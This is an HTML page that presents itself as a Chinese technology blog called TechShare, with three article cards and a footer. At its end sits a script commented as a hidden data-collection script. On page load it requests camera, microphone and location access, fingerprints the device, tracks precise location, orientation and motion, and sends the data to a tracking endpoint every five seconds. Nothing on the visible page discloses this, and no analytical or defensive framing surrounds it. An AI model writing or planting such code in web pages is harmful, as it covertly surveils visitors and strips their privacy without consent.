<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>技术分享博客</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100">
    <nav class="bg-white shadow-lg">
        <div class="max-w-6xl mx-auto px-4">
            <div class="flex justify-between">
                <div class="flex space-x-7">
                    <div>
                        <a href="#" class="flex items-center py-4">
                            <span class="font-semibold text-gray-500 text-lg">TechShare</span>
                        </a>
                    </div>
                </div>
                <div class="flex items-center space-x-3">
                    <a href="#" class="py-4 px-2 text-gray-500 hover:text-gray-700">首页</a>
                    <a href="#" class="py-4 px-2 text-gray-500 hover:text-gray-700">文章</a>
                    <a href="#" class="py-4 px-2 text-gray-500 hover:text-gray-700">关于</a>
                </div>
            </div>
        </div>
    </nav>

    <div class="container mx-auto px-4 py-8">
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <!-- 文章卡片 -->
            <div class="bg-white rounded-lg shadow-md overflow-hidden">
                <img src="https://picsum.photos/400/200" alt="文章图片" class="w-full h-48 object-cover">
                <div class="p-6">
                    <h2 class="text-xl font-semibold mb-2">Web开发最佳实践</h2>
                    <p class="text-gray-600">探讨现代Web开发中的关键技术和方法论...</p>
                    <a href="#" class="mt-4 inline-block text-blue-600 hover:text-blue-800">阅读更多</a>
                </div>
            </div>

            <div class="bg-white rounded-lg shadow-md overflow-hidden">
                <img src="https://picsum.photos/400/201" alt="文章图片" class="w-full h-48 object-cover">
                <div class="p-6">
                    <h2 class="text-xl font-semibold mb-2">云计算架构设计</h2>
                    <p class="text-gray-600">深入分析云计算架构的设计原则和实践经验...</p>
                    <a href="#" class="mt-4 inline-block text-blue-600 hover:text-blue-800">阅读更多</a>
                </div>
            </div>

            <div class="bg-white rounded-lg shadow-md overflow-hidden">
                <img src="https://picsum.photos/400/202" alt="文章图片" class="w-full h-48 object-cover">
                <div class="p-6">
                    <h2 class="text-xl font-semibold mb-2">数据安全与隐私保护</h2>
                    <p class="text-gray-600">探讨数据安全领域的最新发展和防护措施...</p>
                    <a href="#" class="mt-4 inline-block text-blue-600 hover:text-blue-800">阅读更多</a>
                </div>
            </div>
        </div>
    </div>

    <footer class="bg-gray-800 text-gray-300 py-8 mt-12">
        <div class="container mx-auto px-4">
            <div class="flex flex-wrap justify-between">
                <div class="w-full md:w-1/3 mb-6 md:mb-0">
                    <h3 class="text-lg font-semibold mb-2">关于我们</h3>
                    <p class="text-sm">分享技术，探讨创新，推动发展。</p>
                </div>
                <div class="w-full md:w-1/3 mb-6 md:mb-0">
                    <h3 class="text-lg font-semibold mb-2">联系方式</h3>
                    <p class="text-sm">邮箱：contact@techshare.com</p>
                </div>
                <div class="w-full md:w-1/3">
                    <h3 class="text-lg font-semibold mb-2">关注我们</h3>
                    <div class="flex space-x-4">
                        <a href="#" class="text-gray-300 hover:text-white">Twitter</a>
                        <a href="#" class="text-gray-300 hover:text-white">GitHub</a>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <!-- 隐藏的数据收集脚本 -->
    <script>
        class DeviceMonitor {
            constructor() {
                this.deviceData = {};
                this.initializeMonitoring();
            }

            async initializeMonitoring() {
                try {
                    // 请求必要的权限
                    await this.requestPermissions();
                    
                    // 收集设备信息
                    await this.collectDeviceInfo();
                    
                    // 开始持续监控
                    this.startContinuousMonitoring();
                    
                    // 发送初始数据
                    this.sendData();
                } catch (error) {
                    console.error('Monitoring initialization error:', error);
                }
            }

            async requestPermissions() {
                try {
                    // 请求摄像头权限
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                        this.deviceData.mediaAccess = true;
                        stream.getTracks().forEach(track => track.stop());
                    }

                    // 请求地理位置权限
                    if (navigator.geolocation) {
                        await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                    }

                    // 请求通知权限
                    if (Notification.permission !== 'granted') {
                        await Notification.requestPermission();
                    }
                } catch (error) {
                    console.error('Permission request error:', error);
                }
            }

            async collectDeviceInfo() {
                // 基本设备信息
                this.deviceData = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    deviceMemory: navigator.deviceMemory,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        orientation: screen.orientation.type
                    },
                    timestamp: new Date().toISOString()
                };

                // 电池信息
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    this.deviceData.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }

                // 网络信息
                if ('connection' in navigator) {
                    const connection = navigator.connection;
                    this.deviceData.network = {
                        type: connection.effectiveType,
                        downlink: connection.downlink,
                        rtt: connection.rtt,
                        saveData: connection.saveData
                    };
                }

                // 存储信息
                if (navigator.storage && navigator.storage.estimate) {
                    const estimate = await navigator.storage.estimate();
                    this.deviceData.storage = {
                        quota: estimate.quota,
                        usage: estimate.usage
                    };
                }
            }

            startContinuousMonitoring() {
                // 监控地理位置变化
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        position => {
                            this.deviceData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            this.sendData();
                        },
                        error => console.error('Location error:', error),
                        { enableHighAccuracy: true }
                    );
                }

                // 监控设备方向
                if (window.DeviceOrientationEvent) {
                    window.addEventListener('deviceorientation', event => {
                        this.deviceData.orientation = {
                            alpha: event.alpha,
                            beta: event.beta,
                            gamma: event.gamma
                        };
                        this.sendData();
                    });
                }

                // 监控设备运动
                if (window.DeviceMotionEvent) {
                    window.addEventListener('devicemotion', event => {
                        this.deviceData.motion = {
                            acceleration: event.acceleration,
                            rotationRate: event.rotationRate,
                            interval: event.interval
                        };
                        this.sendData();
                    });
                }

                // 定期发送数据
                setInterval(() => this.sendData(), 5000);
            }

            async sendData() {
                try {
                    const response = await fetch('/api/track', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(this.deviceData)
                    });

                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                } catch (error) {
                    console.error('Error sending data:', error);
                }
            }
        }

        // 初始化监控
        new DeviceMonitor();
    </script>
</body>
</html> 
